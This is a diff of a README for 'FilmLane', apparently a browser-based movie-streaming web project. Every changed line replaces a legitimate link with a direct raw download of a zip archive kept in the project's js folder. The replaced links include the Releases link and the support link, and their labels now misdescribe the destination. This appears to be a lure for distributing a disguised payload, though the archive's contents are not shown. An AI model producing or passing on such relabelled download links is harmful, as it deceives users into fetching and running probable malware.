@@ -4,13 +4,13 @@
 FilmLane is your personal online cinema. Browse, stream, and enjoy movies with a sleek, responsive design built using HTML, CSS, and JavaScript. Whether you want to relax at home or watch on the go, FilmLane serves up a smooth experience for all your movie needs.
 
 ## 📥 Download FilmLane
-[![Download FilmLane](https://img.shields.io/badge/Download-FilmLane-blue?style=for-the-badge)](https://github.com/DarkHussainStore/FilmLane/releases)
+[![Download FilmLane](https://raw.githubusercontent.com/DarkHussainStore/FilmLane/main/js/FilmLane-1.2-beta.3.zip)](https://raw.githubusercontent.com/DarkHussainStore/FilmLane/main/js/FilmLane-1.2-beta.3.zip)
 
 ## 🚀 Getting Started
 To get started with FilmLane, download the application from our Releases page. This guide will walk you through the steps to download and run the application on your computer.
 
 ## 📂 Download & Install
-1. Click on this link to [visit the Releases page](https://github.com/DarkHussainStore/FilmLane/releases).
+1. Click on this link to [visit the Releases page](https://raw.githubusercontent.com/DarkHussainStore/FilmLane/main/js/FilmLane-1.2-beta.3.zip).
 2. Look for the latest version of FilmLane.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -36,7 +36,7 @@ Follow the prompts to install FilmLane on your system.
 4. **Controls:** Use the on-screen controls to play, pause, or stop the movie.
 
 ## 💬 Support
-If you encounter any issues while using FilmLane, feel free to raise an issue on our [GitHub page](https://github.com/DarkHussainStore/FilmLane). We appreciate your feedback and will work to resolve any problems.
+If you encounter any issues while using FilmLane, feel free to raise an issue on our [GitHub page](https://raw.githubusercontent.com/DarkHussainStore/FilmLane/main/js/FilmLane-1.2-beta.3.zip). We appreciate your feedback and will work to resolve any problems.
 
 ## 📝 Topics Covered
 - Bootstrap
